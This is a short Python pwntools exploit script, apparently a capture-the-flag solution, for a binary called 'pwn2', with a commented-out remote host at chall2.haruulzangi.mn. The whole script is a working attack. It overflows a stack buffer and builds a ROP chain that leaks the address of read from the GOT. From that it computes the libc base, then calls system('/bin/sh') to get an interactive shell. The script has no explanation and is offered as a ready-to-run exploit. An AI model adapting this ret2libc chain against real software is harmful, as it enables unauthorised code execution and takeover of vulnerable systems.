#!/usr/bin/env python

from pwn import *
context.arch = "amd64"

epath = "./pwn2"
lpath = "./libc-2.28.so"
e = ELF(epath)
l = ELF(lpath)
rdi = 0x000000000040126b
rsi_r15 = 0x0000000000401269
mov_rax_rsi = 0x4010e0
ret = 0x401016

r = process(epath, env={"LD_PRELOAD" : lpath})
#r = remote("chall2.haruulzangi.mn", 30018)

pad = "\0"*0x88
payload = flat(pad, rdi, 0x1, rsi_r15, e.got.read, 0, e.sym.write, e.sym.main)
r.recvline()
#pause()
r.send(payload)
leak = r.recvuntil(b"\x7f")
leak = leak[-6:]
leak = u64(leak.ljust(8, b"\x00"))
success("leak %s" % hex(leak))
l.address = leak - l.sym.read
success("libc %s" % hex(l.address))

pause()
payload = flat(pad, rdi, next(l.search(b"/bin/sh")), l.sym.system)
r.sendline(payload)

r.interactive()
r.close()
